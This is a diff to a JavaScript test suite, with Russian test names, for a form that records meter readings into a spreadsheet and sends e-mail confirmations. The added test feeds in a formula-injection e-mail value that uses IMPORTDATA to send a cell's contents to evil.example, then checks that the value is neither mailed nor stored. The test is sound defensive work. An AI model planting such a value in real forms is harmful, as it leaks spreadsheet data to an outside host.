@@ -124,6 +124,14 @@ const kv1 = (vals) => ({ ...OK, account: KV1, readings: { r1: vals[0], r2: vals[
     assert.strictEqual(G.post({ ...kv1(['28,000', '29,000', '35,000', '13,000']), email: 'a@b.ru' }).mailed, false);
     assert.strictEqual(G.get().mailReply, undefined, 'настройки почты не уходят на сайт');
   });
+  await t('e-mail с формулой не попадает в таблицу и не получает письмо', () => {
+    const G = fresh(); G.setSetting('Подтверждение на почту', 'ДА');
+    const evil = '=IMPORTDATA("https://evil.example/?"&B2)&"@x.ru"';
+    assert.strictEqual(G.post({ ...kv1(['28,000', '29,000', '35,000', '13,000']), email: evil }).ok, true);
+    assert.strictEqual(G.g.mail.length, 0);
+    const cells = [].concat(...Object.values(G.ss.sheets).filter(Boolean).map(sh => sh.rows)).flat().map(String);
+    assert(!cells.some(c => c.startsWith('=')), 'в таблице нет ничего, начинающегося с «=»');
+  });
   await t('форма: поле e-mail появляется при включённой настройке', () => {
     const G = fresh(); assert.strictEqual(G.get().email, false);
     G.setSetting('Подтверждение на почту', 'ДА'); assert.strictEqual(G.get().email, true);
